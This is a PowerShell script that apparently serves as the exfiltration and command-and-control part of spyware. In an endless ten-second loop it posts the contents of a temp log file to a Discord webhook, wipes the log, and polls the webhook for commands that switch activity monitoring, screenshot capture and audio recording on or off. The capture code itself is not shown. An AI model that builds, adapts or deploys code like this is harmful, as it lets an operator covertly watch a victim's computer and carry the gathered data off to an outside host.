# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $dc is the variable passed via the command line

# Define the paths for the temp log file and config file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')
$configFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'config.dat')

# Initialize configuration variables with default values
$activityMonitor = $false
$screenshotCapture = $false
$audioRecording = $false

# Function to load configuration from the .dat file
function Load-Config {
    if (Test-Path $configFilePath) {
        $configContent = Get-Content $configFilePath
        foreach ($line in $configContent) {
            if ($line -match "^activityMonitor\s*=\s*(.*)$") {
                $global:activityMonitor = [bool]::Parse($matches[1])
            }
            elseif ($line -match "^screenshotCapture\s*=\s*(.*)$") {
                $global:screenshotCapture = [bool]::Parse($matches[1])
            }
            elseif ($line -match "^audioRecording\s*=\s*(.*)$") {
                $global:audioRecording = [bool]::Parse($matches[1])
            }
        }
        Write-Host "Configuration loaded from $configFilePath" -ForegroundColor Green
    } else {
        Write-Host "Config file not found. Using default configuration." -ForegroundColor Yellow
    }
}

# Function to save configuration to the .dat file
function Save-Config {
    $configContent = @()
    $configContent += "activityMonitor = $activityMonitor"
    $configContent += "screenshotCapture = $screenshotCapture"
    $configContent += "audioRecording = $audioRecording"
    
    $configContent | Out-File -FilePath $configFilePath -Force
    Write-Host "Configuration saved to $configFilePath" -ForegroundColor Green
}

# Function to read and process commands from Discord
function Check-Discord-Commands {
    try {
        $response = Invoke-RestMethod -Uri $webhookURL -Method Get
        $commands = $response.content.Split(" ")

        foreach ($command in $commands) {
            if ($command -match "^/activityMonitor=(.*)$") {
                $global:activityMonitor = [bool]::Parse($matches[1])
            }
            elseif ($command -match "^/screenshotCapture=(.*)$") {
                $global:screenshotCapture = [bool]::Parse($matches[1])
            }
            elseif ($command -match "^/audioRecording=(.*)$") {
                $global:audioRecording = [bool]::Parse($matches[1])
            }

            # Save the updated configuration after processing commands
            Save-Config
        }
    }
    catch {
        Write-Host "Error while checking Discord commands:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }
}

# Function to send the content of the log file to Discord
function Send-LogToDiscord {
    # Check if the temp log file exists
    if (Test-Path $tempFilePath) {
        # Read the content of the log file
        $logContent = Get-Content $tempFilePath -Raw

        # Check if the log file has content
        if ($logContent) {
            # Get the current timestamp
            $timestamp = Get-Date -Format 'dd-MM-yyyy HH:mm:ss'

            # Create the message to send (content only as a string)
            $message = "$timestamp - $logContent`n`nActivity Monitor: $activityMonitor`nScreenshot Capture: $screenshotCapture`nAudio Recording: $audioRecording"

            # Debugging: Print the message to ensure it's properly formatted
            Write-Host "Message to send:" -ForegroundColor Cyan
            Write-Host $message

            # Try to send the message to the Discord webhook
            try {
                $jsonPayload = @{ content = $message } | ConvertTo-Json
                $response = Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType 'application/json' -Body $jsonPayload
                Write-Host "Response from Discord:" -ForegroundColor Green
                Write-Host $response
            }
            catch {
                Write-Host "Error while sending message to webhook:" -ForegroundColor Red
                Write-Host $_.Exception.Message
            }

            # Clear the content of the temp log file after sending the data
            Clear-Content $tempFilePath
        }
        else {
            Write-Host "No content in log file" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "Temp file not found at path: $tempFilePath" -ForegroundColor Yellow
    }
}

# Create temp log and config files if they don't exist
if (-not (Test-Path $tempFilePath)) {
    New-Item -Path $tempFilePath -ItemType File -Force
    Write-Host "Created temp_log.txt" -ForegroundColor Green
}

if (-not (Test-Path $configFilePath)) {
    Save-Config  # Create the config file with default values
    Write-Host "Created config.dat" -ForegroundColor Green
}

# Load the configuration from the .dat file at the start
Load-Config

# Infinite loop to check log file, Discord commands, and send logs every 10 seconds
while ($true) {
    # Pause for 10 seconds before checking
    Start-Sleep -Seconds 10

    # Send the log content to Discord
    Send-LogToDiscord

    # Check for new commands from Discord
    Check-Discord-Commands
}
